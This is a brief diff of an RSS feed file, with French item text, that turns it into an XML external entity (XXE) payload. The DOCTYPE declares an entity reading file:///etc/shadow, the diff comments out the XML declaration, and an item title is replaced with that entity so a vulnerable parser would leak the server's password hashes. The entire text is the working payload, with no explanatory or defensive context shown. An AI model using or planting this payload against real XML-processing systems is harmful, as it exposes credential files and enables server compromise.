@@ -1,4 +1,4 @@
-<?xml version="1.0" ?>
+<!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
 <rss version="2.0">
 <channel>
@@ -15,7 +15,6 @@
       <description>Tout  savoir sur RSS</description>
    </item>
    <item>
-     <title>Nouvelle  du lendemain</title>
      <title>&ent;</title>
     <link>https://www.xul.fr/xml-rdf.php</link> 
     <description>Et  tout savoir sur RDF</description>
